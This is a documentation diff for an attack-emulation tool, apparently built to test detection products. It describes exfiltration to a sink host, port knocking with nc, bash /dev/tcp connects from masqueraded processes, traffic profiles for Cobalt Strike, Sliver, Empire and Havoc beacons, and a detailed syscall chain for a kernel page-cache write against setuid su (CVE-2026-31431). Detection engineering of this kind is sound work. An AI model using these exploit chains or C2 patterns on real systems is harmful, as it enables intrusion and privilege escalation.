+- `target`: Target for exfiltration (domain for DNS, IP for ICMP, URL for HTTP). DNS default: `t1048.signalbench.sigre.xyz` (GoCortex-controlled exfil sink)
 
 Artefacts:
 - Exfiltration data file (cleaned up automatically after execution)
@@ -1599,36 +1799,29 @@ Detection opportunities:
 ### T1205 - Traffic Signaling
 
 Description:  
-Uses cron to install TCP filters on network interfaces for covert signaling and command and control communications.
+Installs iptables LOG rules to flag inbound SYN packets on a defined knock-port sequence, then sends the outbound knock sequence to the sinkhole. Both the receive-side ruleset and the offensive traffic pattern are produced so detection rules on either side can be exercised.
 
 How it works:
-1. Creates cron jobs to periodically install network traffic filters
-2. Supports multiple filter types including iptables rules and tc (traffic control) filters
-3. Configures filters to monitor specific TCP ports for incoming signals
-4. Uses realistic cron scheduling to simulate persistent monitoring
-5. Creates filter rules that could be used for covert C2 channel activation
-6. Logs all cron job creation and filter installation activities
+1. Validates the network interface and captures the current INPUT chain rule count for cleanup baseline
+2. Installs iptables LOG rules with a `PORT_KNOCK[<port>]:` prefix on each port in the knock sequence (defaults: 1337, 31337, 8080) so SYN packets to these ports appear in syslog with that marker
+3. Resolves the sinkhole IP and sends the outbound knock sequence: a TCP connect probe to each port in order, paced at 250ms apart so the sequence is recognisable as port knocking rather than a parallel scan. Prefers `nc -z -w 1 <ip> <port>` so the `nc` binary name appears in argv (the canonical port-knock fingerprint); falls back to a direct Tokio TCP connect when `nc` is not on PATH.
+4. Logs both the rule installation status and the outbound knock results to the technique log
+5. Cleanup removes the installed iptables rules
 
 Parameters:
-- `interface`: Network interface to install filter on (default: eth0)
-- `filter_type`: Type of TCP filter - iptables or tc_filter (default: iptables)
-- `target_port`: TCP port to filter for signaling (default: 8443)
-- `cron_schedule`: Cron expression for filter installation (default: */15 * * * *)
-- `log_file`: Path to save traffic signaling log (default: /tmp/signalbench_traffic_signaling.log)
+- `interface`: Network interface to validate (default: eth0)
+- `knock_ports`: Comma-separated port knock sequence (default: 1337,31337,8080)
+- `log_file`: Path to save the technique log (default: /tmp/signalbench_port_knocking.log)
 
 Artefacts:
-- Temporary cron job entries (cleaned up automatically after execution)
-- Network filter rules and scripts (cleaned up automatically after execution)
-- Traffic signaling log file (cleaned up automatically after execution)
-- Filter installation scripts (cleaned up automatically after execution)
+- Installed iptables LOG rules, tracked per port and removed on cleanup
+- Technique log at `/tmp/signalbench_port_knocking.log` (cleaned up automatically)
 
 Detection opportunities:
-- Monitor cron job modifications for network-related tasks
-- Detect iptables or tc filter rule changes
-- Monitor network interface configuration changes
-- Unusual traffic patterns on filtered ports
-- Periodic network filter installation activities
-- Cron jobs executing network commands
+- `iptables -A INPUT ... -j LOG --log-prefix 'PORT_KNOCK[...]'` invocations
+- Outbound TCP SYN bursts to a fixed port sequence at sub-second pacing (port-knock client signature)
+- `nc -z` invocations against multiple ports in rapid succession to the same host
+- Syslog entries with the `PORT_KNOCK[<port>]:` prefix when inbound SYN packets land on monitored ports
 
 ### T1105 - Ingress Tool Transfer
 
@@ -1766,8 +1959,8 @@ How it works:
    - Performs random read/write operations
    - Stresses disk throughput with dd operations
 5. Simulates cryptocurrency mining behaviour:
-   - Creates processes named similar to miners (xmrig, ethminer, cpuminer)
-   - Connects to mining pool addresses (simulated)
+   - Renames the main process and each CPU stress thread via `prctl(PR_SET_NAME)` to recognised cryptominer names (`xmrig`, `kdevtmpfsi`, `kinsing`, `t-rex`) so the comm field shown in `ps`, `/proc/<pid>/comm`, and `/proc/<pid>/task/<tid>/comm` matches what XDR rules for resource hijacking key on. CPU stress threads are OS threads (`std::thread`), not tokio tasks, so the prctl rename does not disturb the async runtime.
+   - The original process name is restored when the stress window ends
    - Generates realistic mining process telemetry
 6. Implements resource monitoring:
    - Tracks CPU usage percentages
@@ -2104,29 +2297,32 @@ Detection opportunities:
 **Attribution:** Based on ttp-bench IOC patterns and threat intelligence feeds
 
 Description:  
-Connects to known malicious and suspicious domains to generate C2-like network telemetry. Includes connections to suspicious TLDs (.tk, .ru, .cn), DGA-like high-entropy domains, and TEST-NET IP addresses per RFC 5737 for safe testing.
+Connects to known malicious and suspicious domains across four phases to generate C2-like network telemetry. Phase 1 sends HTTP requests profiled to match nine C2 frameworks: PoshC2 (10 binary-variant POSTs with SessionID= cookie), Sliver (19-request session with IE11 User-Agent, mixing Snort-rule-targeted prefixed paths with numeric nonces and Razy-coverage un-prefixed paths with hex nonces), Cobalt Strike (6 HTTP patterns covering Snort sids 63772/65446/300048/54175/54182/56616 plus the /track Razy beacon), AdaptixC2 BEACON (4 POSTs to /uri.php and /endpoint/api with X-Beacon-Id / X-App-Id headers and size-prefixed RC4 bodies), PowerShell Empire (4-request lifecycle: /launcher stager pull, then STAGE1 / RESULT_POST / TASKING_REQUEST beacons with RoutingPacket session cookies), Mythic Apollo (3-request lifecycle: encrypted-blob checkin POST, JhY3Rpb24iOi= URI literal GET, encrypted-blob post_response POST), Havoc (3-request DEADBEEF/B16B00B5 sequence), BabyShark (nasbench /momyshark route), and standard framework probes including web shell patterns. Phase 2 runs full Stratum v1 cryptocurrency mining sessions against pool.signalbench-mining.com and stratum.signalbench-crypto.net on ports 3333 and 4444, maintaining at least 5 seconds of bidirectional dwell per connection so Palo Alto App-ID classifies each session as stratum-mining. Phase 3 opens a TLS 1.2 connection to the sinkhole on port 8888; the sinkhole presents a certificate with CN=AsyncRAT Server, triggering the AsyncRAT Snort rule on TLS handshake inspection (TLS 1.2 is required because TLS 1.3 encrypts the Certificate message). Phase 4 sends raw UDP/53 probes to the sinkhole IP: a 78-byte dnscat2 tunnel-init packet and two 27-byte Cobalt Strike DNS beacon packets (QTYPE A and TXT).
 
 Domains and IPs tested:
 
 | Target | Category |
 |--------|----------|
 | signalbench-c2-test.tk | Suspicious TLD (.tk) |
-| signalbench-malware.ru | Suspicious TLD (.ru) |
-| signalbench-backdoor.cn | Suspicious TLD (.cn) |
-| signalbench-rat.xyz | Suspicious TLD (.xyz) |
+| signalbench-malware.ru | Suspicious TLD (.ru) / Cobalt Strike HTTP profiles |
+| signalbench-backdoor.cn | Suspicious TLD (.cn) / PoshC2 profiles |
+| signalbench-rat.xyz | Suspicious TLD (.xyz) / Sliver HTTP profiles |
 | signalbench-payload.top | Suspicious TLD (.top) |
 | xk8f2m9p3q.t1071.signalbench.sigre.xyz | DGA-like pattern |
 | a1b2c3d4e5f6.t1071.signalbench.sigre.xyz | DGA-like pattern |
 | q9w8e7r6t5.t1071.signalbench.sigre.xyz | DGA-like pattern |
 | update.signalbench-services.com | Update masquerading |
 | cdn.signalbench-delivery.net | CDN masquerading |
-| api.signalbench-auth.io | API masquerading |
+| api.signalbench-auth.io | API masquerading / BabyShark and dnscat2 HTTP profiles |
 | 192.0.2.1 | TEST-NET-1 IP (RFC 5737) |
 | 198.51.100.1 | TEST-NET-2 IP (RFC 5737) |
 | 203.0.113.1 | TEST-NET-3 IP (RFC 5737) |
 | signalbench.onion.link | Tor proxy pattern |
-| pool.signalbench-mining.com | Mining pool pattern |
-| stratum.signalbench-crypto.net | Stratum protocol pattern |
+| pool.signalbench-mining.com | Mining pool pattern (Stratum Phase 2) |
+| stratum.signalbench-crypto.net | Stratum protocol pattern (Stratum Phase 2) |
+| signalbench-mythic.pw | Mythic Apollo C2 pattern (.pw TLD) |
+| signalbench-havoc.cc | Havoc C2 pattern (.cc TLD) |
+| signalbench-empire.net | PowerShell Empire C2 listener (.net masquerade) |
 
 Domain classification:
 
@@ -2134,23 +2330,23 @@ Domains are split into two categories. Safe domains are always tested without pr
 
 - Safe: *.sigre.xyz (GoCortex-owned; DNS resolves without host entries)
 - Safe: TEST-NET IP addresses 192.0.2.1, 198.51.100.1, 203.0.113.1 (RFC 5737)
-- Unowned: signalbench-c2-test.tk, signalbench-malware.ru, signalbench-backdoor.cn, signalbench-rat.xyz, signalbench-payload.top, update.signalbench-services.com, cdn.signalbench-delivery.net, api.signalbench-auth.io, signalbench.onion.link, pool.signalbench-mining.com, stratum.signalbench-crypto.net
+- Unowned: signalbench-c2-test.tk, signalbench-malware.ru, signalbench-backdoor.cn, signalbench-rat.xyz, signalbench-payload.top, signalbench-empire.net, update.signalbench-services.com, cdn.signalbench-delivery.net, api.signalbench-auth.io, signalbench.onion.link, pool.signalbench-mining.com, stratum.signalbench-crypto.net, signalbench-mythic.pw, signalbench-havoc.cc
 
 How it works (root mode):
 
 1. Detects root privileges via geteuid()
 2. Reads /etc/hosts and checks for an existing SIGNALBENCH-T1071-IOC-START marker
-3. If not present, builds a marker block mapping all 11 unowned domains to 203.0.113.1 (TEST-NET-3)
+3. If not present, resolves the sinkhole IP from `sinkhole.signalbench.sigre.xyz` (fallback `203.0.113.1`) then builds a marker block mapping all 14 unowned domains to that IP
 4. Writes the block atomically: writes to /etc/.hosts.signalbench.{pid}, then renames over /etc/hosts
 5. Creates /tmp/.signalbench_t1071_hosts_modified to record that the file was changed
-6. Tests all 17 targets via curl and dig
+6. Tests all 19 targets via curl and dig
 7. On cleanup, reads /etc/hosts and verifies both START and END markers are present
 8. If one marker is missing (malformed block), cleanup aborts and prints a manual intervention warning
 9. If both markers are present, strips the marker block atomically and removes the marker file
 
 How it works (non-root mode):
 
-1. For each unowned domain, calls getent hosts to check whether it resolves to 203.0.113.1
+1. For each unowned domain, calls getent hosts to check whether it resolves to the runtime-resolved sinkhole IP (from `sinkhole.signalbench.sigre.xyz`, fallback `203.0.113.1`)
 2. Domains that do not resolve to that IP are skipped; a [WARN] block lists them with manual /etc/hosts instructions
 3. Safe domains and any unowned domains already present in /etc/hosts are tested normally
 4. /etc/hosts is not modified; no marker file is created
@@ -2164,12 +2360,66 @@ Common steps (both modes):
 5. Prints per-target [OK] / [--] / [FAIL] / [WARN] status to console
 6. Prints summary on completion: attempted, successful, failed, skipped
 
-Commands executed:
+Commands executed (Phase 1):
 ```bash
 getent hosts {domain}
 curl -s -o /dev/null -w "%{http_code},%{time_total},%{remote_ip}" --max-time 3 --connect-timeout 3 http://{target}
 dig +short +time=1 +tries=1 {target}
 ```
+
+Phase 1 also dispatches framework-specific request sequences for each of the nine C2 profiles:
+
+- PoshC2: 10 POST requests to /news.php with `Cookie: SessionID=<base64url(variant[:16])>` and `Content-Type: application/octet-stream`; 40-byte binary bodies from the POSHC2_VARIANTS constant
+- Sliver: 19 requests to signalbench-rat.xyz using `Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko` User-Agent and `Accept-Language: en-US`.  Split into three sub-sets: (a) 8 requests targeting Snort sids 57675-57682 with prefixed paths (e.g. `/static/robots.txt`, `/wordpress/login.php`) and numeric `?_=[0-9]{1,9}` nonces; (b) 3 framework-extension variants (.woff stager, .html key exchange, .png close session); (c) 8 Razy-coverage requests with the un-prefixed pre-Plan-D URI set (`/robots.txt`, `/wp/in.php`, `/api.php`, etc.) and hex `?_=<16hex>` nonces.  All POSTs carry no Content-Type and no body
+- Cobalt Strike: GET /get with `Cookie: auth_tokenAB01=<32 uppercase chars>`; GET /oscp/beacon with Chrome/88 UA and no Accept-Encoding; POST /submit.php?id=1 with 4-byte LE length prefix and binary body; GET /mPlayer; GET then POST /compatible?id=<uuid> with `data=<b64>&from=0` body; POST /track with `{"locale":"en","channel":"prod","addon":"<uuid>","cli":"<val>","l-<val>":"<val>"}` body (the `/track` JSON also fires the PAN Razy C2 sig)
+- AdaptixC2 BEACON: 4 POSTs to signalbench-payload.top (default `/uri.php` with `X-Beacon-Id` header + Firefox 20 UA + `Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Firefox/20.0`; observed `/endpoint/api` with `X-App-Id` header + Chrome 121 UA), body `[4-byte LE size][N-byte RC4 ciphertext][16-byte RC4 key]`
+- Empire: 4-request lifecycle to signalbench-empire.net with IE11 Trident/7.0 UA: GET /launcher (stager), GET /admin/get.php (STAGE1), POST /login/process.php (RESULT_POST), GET /news.php (TASKING_REQUEST).  Session cookie value is base64 of Empire 5 RoutingPacket: 12-byte nonce + 32-byte ChaCha20-Poly1305 block + optional encData
+- Mythic Apollo: 3-request lifecycle to signalbench-mythic.pw with `Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko` UA: POST /data checkin (body = base64(UUID + IV(16) + ciphertext(240) + HMAC-SHA256(32))); GET /index?q=JhY3Rpb24iOi=<base64(uuid+plaintext-JSON)> for the Snort sid:63316 URI literal match; POST /data post_response (encrypted-blob shape)
+- Havoc: GET `/js/jquery-3.6.4.min.js?id=<rand>&hash=<rand>` with `Server: Apache` request header; POST `/Collectors/3.0/settings/mail/` with `DE AD BE EF` at bytes 4-7 and `00 00 00 20` at bytes 8-11; POST `/<rand>` with `B1 6B 00 B5` at bytes 4-7
+- BabyShark: GET `/momyshark?key=b4bysh4rk` with `Chrome/70.0.3538.77` User-Agent; follow-up POST with pipe-delimited exfil payload to api.signalbench-auth.io
+- dnscat2 HTTP tunnel: POST requests to api.signalbench-auth.io with `Go-http-client/1.1` User-Agent and `X-Session-ID` header
+
+A 2-second sleep is applied after each multi-request sequence to allow the PA-440 to age out each session before the next profile begins.
+
+Confirmed PAN PA-440 detections from this profile set: Cobalt Strike Beacon C2, Razy C2,
+AdaptixC2 C2, Havoc Framework C2, AsyncRAT C2, Generic Cryptominer, CobaltStrike.Gen DNS.
+Sliver, Mythic Apollo, and Empire PAN signatures appear to require HTTPS layer presence
+and Go/C#-specific JA3 fingerprints; they do not fire on plain HTTP traffic generated
+from Python stdlib or the Rust binary's plain-HTTP path.
+
+Phase 2: Stratum Protocol Simulation
+
+After Phase 1 completes, the technique opens direct TCP connections to pool.signalbench-mining.com and stratum.signalbench-crypto.net on ports 3333 and 4444. Each connection runs a full Stratum v1 exchange that generates bidirectional JSON-RPC traffic for at least 5 seconds.
+
+Exchange sequence per connection:
+
+1. Client sends mining.subscribe; server responds with subscribe result, mining.set_difficulty, and mining.notify (job sb00); client extracts job_id from the notify
+2. Client sends mining.authorize; server responds with authorize result, updated mining.set_difficulty, mining.notify (job sb01), and a client.get_version request; client sends client.get_version response
+3. Four submit rounds, each ~1 second apart:
+   - Client sends mining.submit with the current job_id and an incrementing nonce
+   - Server responds with accepted result and a new mining.notify (sb02, sb03, sb04, sb05)
+   - Client updates job_id from the notify; if no notify is received, synthesises the next expected job_id
+4. Client sends mining.ping; server responds with mining.pong
+5. A top-up sleep is applied if total elapsed time is under 5 seconds
+
+Phase 2 uses direct TCP connections implemented in Rust; no shell commands are invoked. Both refused and timed-out connections still generate telemetry because a TCP SYN is sent regardless of outcome.
+
+Phase 3: AsyncRAT TLS Handshake
+
+After Phase 2 completes, the technique opens a TLS connection to the sinkhole on port 8888. The sinkhole presents a pre-generated self-signed certificate with CN=AsyncRAT Server. The TLS handshake is sufficient to trigger the AsyncRAT Snort rule, which fires on the server certificate CN during SSL negotiation inspection.
+
+Commands executed (Phase 3):
+```bash
+openssl s_client -connect <sinkhole_ip>:8888 -brief -servername asyncrat.signalbench.local </dev/null
+```
+
+Phase 4: Raw DNS Probes
+
+After Phase 3, two sets of raw UDP packets are sent directly to the sinkhole IP on port 53 using a Tokio UDP socket. No shell commands are invoked and no response is expected; the outbound UDP packet is the telemetry event.
+
+1. dnscat2 tunnel-init packet (78 bytes): Transaction ID `00 01`, flags `01 00` (standard query, RD=1), one question with a label containing `!command` at byte 18 of the QNAME. Targets the snort3-malware-cnc.rules MALWARE-CNC dnscat2 DNS tunnelling channel initialisation rule.
+
+2. Cobalt Strike DNS beacons (27 bytes each): QNAME label `\x03aaa\x05stage\x00`. Sent twice: QTYPE 0x0001 (A record, sid:45906) then QTYPE 0x0010 (TXT record, sid:45907). Targets snort3-malware-cnc.rules MALWARE-CNC CobaltStrike DNS Beacon outbound rules.
 
 Parameters:
 - `log_file`: Path to save connection log (default: /tmp/signalbench_suspicious_domains.log)
@@ -2180,12 +2430,22 @@ Artefacts:
 - /tmp/.signalbench_t1071_hosts_modified (root mode only; removed on cleanup)
 
 Detection opportunities:
-- DNS queries to suspicious TLDs (.tk, .ru, .cn, .xyz, .top)
+- DNS queries to suspicious TLDs (.tk, .ru, .cn, .xyz, .top, .pw, .cc)
 - Connections to known malicious infrastructure patterns
 - High-entropy domain name patterns (DGA detection)
 - Beaconing behaviour patterns
+- PoshC2: `Cookie: SessionID=` header with binary POST body (snort3-malware-cnc.rules)
+- Sliver: IE11 User-Agent (`Trident/7.0; rv:11.0`) with `?_=<hex>` URI suffix (snort3-malware-other.rules)
+- Cobalt Strike HTTP: auth_token cookie pattern, /oscp/ URI, binary /submit.php?id= POST, /mPlayer URI, /compatible?id= check-in sequence, /track JSON body with cli and l- keys (snort3-malware-cnc.rules sids 63772/65446/300048/54175/54182/56616)
+- Mythic: `JhY3Rpb24iOi` base64 URI parameter; decoded value contains UUID dashes at fixed offsets and a JSON open brace (snort3-malware-cnc.rules)
+- Havoc: jquery-masquerade GET with `Server: Apache` in the request; DEADBEEF and B16B00B5 magic bytes at offset 4 of POST body (snort3-malware-cnc.rules)
+- BabyShark: /momyshark route with Chrome/70 User-Agent (indicator-based; no dedicated Snort rule)
 - Mining pool connection patterns (pool.*, stratum.*)
+- Stratum JSON-RPC exchange over TCP 3333/4444 (mining.subscribe, mining.authorize, mining.submit, mining.ping); classified by Palo Alto App-ID as stratum-mining
 - Tor proxy patterns (.onion.link)
+- AsyncRAT TLS: server certificate CN=AsyncRAT Server on TLS handshake (snort3-malware-cnc.rules; flow:to_client,established; service:ssl)
+- dnscat2 DNS: raw UDP/53 with `!command` bytes at QNAME offset 18 (snort3-malware-cnc.rules)
+- Cobalt Strike DNS: QTYPE A and TXT beacons with aaa.stage QNAME label (snort3-malware-cnc.rules sids 45906/45907)
 - Connections to TEST-NET IP ranges
 - CDN/API masquerading domain patterns
 
@@ -2193,17 +2453,15 @@ Detection opportunities:
 
 ### T1036-PROC - Process Name Masquerading
 
-**Attribution:** Based on ttp-bench masquerading patterns
-
 Description:  
-Changes process name at runtime using prctl(PR_SET_NAME) to mimic legitimate system processes like [kworker], [migration], sshd, or systemd. Demonstrates how malware evades process listing detection.
+Changes process name at runtime using prctl(PR_SET_NAME) to mimic legitimate system processes like [kworker], [migration], sshd, or systemd. Each spawned masqueraded child performs activity that a real kernel worker or system daemon would not - writing to a user-path stage file and opening a TCP socket - so the detection signal goes beyond a spoofed ps row.
 
 How it works:
 1. Records original process name from /proc/self/comm
-2. Uses prctl(PR_SET_NAME) to change process name
-3. Writes directly to /proc/self/comm as alternative method
-4. Spawns child processes with masqueraded names
-5. Restores original process name after demonstration
+2. Uses prctl(PR_SET_NAME) to change the main process name
+3. Writes directly to /proc/self/comm as an alternative method
+4. Spawns a bash helper script that renames itself, then forks four subshell children renamed to `kworker`, `apache2`, `sshd`, and `crond`. Each child writes a stage file at `/tmp/.cache-masq-<name>` and attempts a TCP connect to the sinkhole via bash `/dev/tcp/<sinkhole>/80`. A real `[kworker]` thread does not open user-space sockets or write to user paths - this is the strong behavioural signal.
+5. Restores the original process name after demonstration
 6. Generates telemetry for process monitoring detection
 
 Parameters:
@@ -2212,6 +2470,8 @@ Parameters:
 
 Artefacts:
 - Masquerading log file (cleaned up automatically)
+- Stage files at `/tmp/.cache-masq-{kworker,apache2,sshd,crond}` (cleaned up automatically)
+- Helper script at `/tmp/signalbench_masq_child.sh` (cleaned up automatically)
 
 Detection opportunities:
 - prctl syscalls with PR_SET_NAME
@@ -2219,6 +2479,7 @@ Detection opportunities:
 - Mismatched process names vs executable paths
 - Kernel thread names from userspace processes
 - Comm field changes in process accounting
+- Processes appearing as `[kworker]`, `sshd`, or `crond` writing to user paths or opening outbound TCP sockets (kernel workers never do this)
 
 ### T1070.004-SELF - Self-Deleting Binary Pattern
 
@@ -2266,7 +2527,8 @@ How it works:
 4. Adds rules with verdict patterns (accept, drop, reject, queue)
 5. Performs rapid rule creation/deletion cycles to trigger memory patterns
 6. Executes fork operations mimicking exploit behaviour
-7. Complete cleanup removes all nftables rules and tables
+7. Writes a recognisable PoC artefact at `/tmp/cve-2024-1086-poc-<pid>.c` containing a fragment with the CVE ID, characteristic kernel API references (`nft_setelem_catchall`, `nf_tables`), and a published-reference comment. Holds the file for 2 seconds so file-content scanners can register it, then removes it (or retains it under `--no-cleanup`).
+8. Complete cleanup removes all nftables rules and tables
 
 Commands executed:
 ```bash
@@ -2282,12 +2544,21 @@ Parameters:
 - `rule_iterations`: Number of rule manipulation cycles (default: 50)
 - `fork_attempts`: Number of fork operations (default: 10)
 
+Verification phase:
+- Uses shared `verify_command` helper to run `/bin/sh -c "id -u"` after the exploit chain completes. The shell wrap places the verification under a sh -> id process tree rather than signalbench -> id, matching the post-exploitation lineage real tooling produces.
+- Logs `[CVE-2024-1086] [VERIFIED] id ok: 0` when privilege escalation is achieved
+- On success, additionally logs `[CVE-2024-1086] [CRITICAL] Privilege escalation VERIFIED: id ok: 0`
+- Logs `[CVE-2024-1086] [UNVERIFIED] <reason>` on a patched kernel (expected outcome)
+- Verification is always attempted; force mode does not skip it
+
 Detection opportunities:
 - User namespace creation (unshare syscalls)
 - Rapid nftables rule manipulation
 - Netfilter verdict pattern sequences
 - Process forking patterns during rule manipulation
 - nft command execution with specific table names
+- A `/bin/sh -c "id -u"` invocation immediately after the exploit chain (post-exploit EUID check under a shell parent)
+- File write to `/tmp/cve-2024-1086-poc-*.c` containing CVE-keyed PoC content (file reputation and AV file scanners)
 
 ### T1068.002 - CVE-2025-38352 POSIX CPU Timer Race
 
@@ -2301,7 +2572,8 @@ How it works:
 4. Attempts timer deletion race via rapid timer_delete calls
 5. Uses ptrace operations for process tracing (optional)
 6. Simulates signalfd for timer signal handling
-7. Complete cleanup kills child processes and removes temp files
+7. Writes a recognisable PoC artefact at `/tmp/cve-2025-38352-poc-<pid>.c` containing a fragment with the CVE ID, the affected kernel path (`kernel/time/posix-cpu-timers.c`), and characteristic API references (`timer_create`, `SIGEV_THREAD_ID`, `tgkill`). Holds the file for 2 seconds, then removes it (or retains under `--no-cleanup`).
+8. Complete cleanup kills child processes and removes temp files
 
 Commands executed:
 ```bash
@@ -2316,12 +2588,21 @@ Parameters:
 - `race_iterations`: Number of race attempts (default: 100)
 - `use_ptrace`: Enable ptrace operations (default: true)
 
+Verification phase:
+- Uses shared `verify_command` helper to run `/bin/sh -c "id -u"` after the exploit chain completes. The shell wrap places the verification under a sh -> id process tree rather than signalbench -> id.
+- Logs `[CVE-2025-38352] [VERIFIED] id ok: 0` when privilege escalation is achieved
+- On success, additionally logs `[CVE-2025-38352] [CRITICAL] Privilege escalation VERIFIED: id ok: 0`
+- Logs `[CVE-2025-38352] [UNVERIFIED] <reason>` on a patched kernel (expected outcome)
+- Verification is always attempted; force mode does not skip it
+
 Detection opportunities:
 - timer_create/timer_delete syscalls
 - Rapid process forking patterns
 - ptrace attachments to child processes
 - signalfd creation for timer signals
 - C compilation followed by immediate execution
+- A `/bin/sh -c "id -u"` invocation immediately after the exploit chain (post-exploit EUID check under a shell parent)
+- File write to `/tmp/cve-2025-38352-poc-*.c` containing CVE-keyed PoC content
 
 ### T1068.003 - CVE-2025-40190 Ext4 Xattr Underflow
 
@@ -2334,7 +2615,8 @@ How it works:
 3. Performs rapid xattr set/get cycles to manipulate refcounts
 4. Uses getfattr to read back and verify attribute states
 5. Attempts attribute deletion and recreation sequences
-6. Complete cleanup removes all test files and attributes
+6. Writes a recognisable PoC artefact at `/tmp/cve-2025-40190-poc-<pid>.c` containing a fragment with the CVE ID, the affected kernel path (`fs/ext4/xattr.c`), and the characteristic `EXT4_XATTR_PAD` underflow trigger constants. Holds the file for 2 seconds, then removes it (or retains under `--no-cleanup`).
+7. Complete cleanup removes all test files and attributes
 
 Commands executed:
 ```bash
@@ -2349,12 +2631,114 @@ Parameters:
 - `test_file_count`: Number of test files to create (default: 5)
 - `xattr_iterations`: Number of xattr manipulation cycles (default: 50)
 
+Verification phase:
+- Uses shared `verify_command` helper to run `/bin/sh -c "id -u"` after the exploit chain completes. The shell wrap places the verification under a sh -> id process tree rather than signalbench -> id.
+- Logs `[CVE-2025-40190] [VERIFIED] id ok: 0` when privilege escalation is achieved
+- On success, additionally logs `[CVE-2025-40190] [CRITICAL] Privilege escalation VERIFIED: id ok: 0`
+- Logs `[CVE-2025-40190] [UNVERIFIED] <reason>` on a patched kernel (expected outcome)
+- Verification is always attempted; force mode does not skip it
+
 Detection opportunities:
 - setfattr/getfattr command execution
 - Extended attribute syscalls (setxattr, getxattr, removexattr)
 - Rapid filesystem metadata operations
 - Trusted namespace xattr manipulation
 - File operations in temporary directories
+- A `/bin/sh -c "id -u"` invocation immediately after the exploit chain (post-exploit EUID check under a shell parent)
+- File write to `/tmp/cve-2025-40190-poc-*.c` containing CVE-keyed PoC content
+
+### T1068.004 - CVE-2026-31431 Copy Fail
+
+Description:
+Executes the CVE-2026-31431 AF_ALG + splice + recv syscall chain against /usr/bin/su (Phase 1),
+then writes the original copy.fail/exp proof-of-concept script to /tmp as a non-executed file
+artefact and deletes it (Phase 2). The two phases are complementary detection surfaces and both
+run from a single `signalbench run T1068.004` invocation.
+
+A logic flaw in algif_aead.c causes page-cache pages delivered via splice() to land in the
+writable AEAD destination scatterlist; the authencesn scratch write overwrites 4 controlled bytes
+in the kernel's cached copy of the target file without touching on-disk data.
+
+Safety contract: counter-pattern payload only (no shellcode), no execve, posix_fadvise(DONTNEED)
+eviction after every chunk. The Phase 2 file is never executed.
+
+How it works:
+
+Phase 1 - AF_ALG syscall chain (37-chunk loop):
+
+1. Target file preparation:
+   - open(/usr/bin/su, O_RDONLY) and fstat to confirm SUID flag
+   - read(first 4096 bytes) to warm the page cache
+
+2. Per-chunk loop (37 iterations x 4 bytes = 148-byte counter-pattern payload):
+   For each 4-byte chunk, a fresh AF_ALG socket is created and the full chain runs:
+   - socket(AF_ALG, SOCK_SEQPACKET, 0)
+   - bind() with authencesn(hmac(sha256),cbc(aes)) AEAD algorithm
+   - setsockopt(SOL_ALG, ALG_SET_KEY) with COPY_FAIL_KEY: 40-byte
+     crypto_authenc_key_param netlink attribute header
+     (08 00 01 00 00 00 00 10 = nla_len=8, nla_type=1, enckeylen=16)
+     followed by 32 null bytes (16-byte HMAC auth key || 16-byte AES enc key)
+   - setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, 4)
+   - accept() to obtain the transform fd
+   - sendmsg(tfm_fd, MSG_MORE) with iov=[0x41 x 4 || chunk[0..4]] and control messages:
+       ALG_SET_OP = ALG_OP_DECRYPT
+       ALG_SET_IV = 16-byte null IV
+       ALG_SET_AEAD_AUTHSIZE = 4
+     Note: sendmsg is called BEFORE the splice pair — the exact ordering the real exploit uses
+   - pipe2(O_CLOEXEC)
+   - splice(file_fd, offset_src=chunk_offset, pipe_w, len=chunk_offset+4)
+   - splice(pipe_r, tfm_fd, len=chunk_offset+4)
+   - recv(tfm_fd, buf, 8 + chunk_offset) -> EBADMSG/EINVAL expected
+   - posix_fadvise(file_fd, 0, 0, POSIX_FADV_DONTNEED) to evict the page-cache entry
+   - All file descriptors for this chunk closed
+
+Phase 2 - PoC file artefact:
+
+1. Decrypts the copy.fail/exp script bytes in memory (XOR with fixed key; stored encrypted
+   in the binary to avoid binary-level scanning)
+2. Writes the decrypted bytes to /tmp/signalbench_copyfail_<pid>.py
+3. Waits 2 seconds to allow file-scanning to complete
+4. Deletes the file
+5. The file is never executed
+
+Syscalls generated (one representative chunk iteration; 37 iterations run in total):
+```
+socket(AF_ALG, SOCK_SEQPACKET, 0)
+bind(alg_fd, {salg_type="aead", salg_name="authencesn(hmac(sha256),cbc(aes))"})
+setsockopt(alg_fd, SOL_ALG, ALG_SET_KEY, copy_fail_key, 40)
+setsockopt(alg_fd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, 4)
+accept(alg_fd, NULL, NULL) -> tfm_fd
+open("/usr/bin/su", O_RDONLY) -> file_fd
+fstat(file_fd, ...)
+read(file_fd, buf, 4096)
+sendmsg(tfm_fd, {iov=[0x41*4 || chunk], cmsg=[ALG_SET_OP, ALG_SET_IV, ALG_SET_AEAD_AUTHSIZE]}, MSG_MORE)
+pipe2([pipe_r, pipe_w], O_CLOEXEC)
+splice(file_fd, &offset=chunk_offset, pipe_w, NULL, chunk_offset+4, 0)
+splice(pipe_r, NULL, tfm_fd, NULL, chunk_offset+4, 0)
+recv(tfm_fd, buf, 8+chunk_offset, 0)  -> EBADMSG/EINVAL
+posix_fadvise(file_fd, 0, 0, POSIX_FADV_DONTNEED)
+openat(AT_FDCWD, "/tmp/signalbench_copyfail_<pid>.py", O_WRONLY|O_CREAT)  [Phase 2]
+unlinkat(AT_FDCWD, "/tmp/signalbench_copyfail_<pid>.py")                    [Phase 2]
+```
+
+Parameters:
+- `target_file`: Target setuid binary for page-cache write (default: /usr/bin/su)
+
+Detection opportunities:
+- Phase 1 syscall signals:
+  - socket(AF_ALG, SOCK_SEQPACKET) syscall repeated ~37 times in a tight loop — rare outside
+    kernel crypto test suites
+  - bind() with authencesn AEAD algorithm name string
+  - setsockopt(SOL_ALG, ALG_SET_KEY) with a 40-byte netlink-attribute-encoded key
+  - sendmsg() with MSG_MORE and ALG_SET_IV/ALG_SET_OP control messages called BEFORE splice()
+  - splice() from a setuid binary into an AF_ALG transform fd
+  - posix_fadvise(POSIX_FADV_DONTNEED) on a setuid binary immediately after splice activity,
+    repeated per iteration — high-confidence page-cache eviction pattern
+  - Combination of AF_ALG socket + splice-from-setuid-binary is a strong exploitation indicator
+- Phase 2 file signals:
+  - Creation of /tmp/signalbench_copyfail_<pid>.py — file reputation or content-hash match
+    against the copy.fail/exp PoC script
+  - File is written and deleted without being executed; write event alone is the detection signal
 
 ---
 
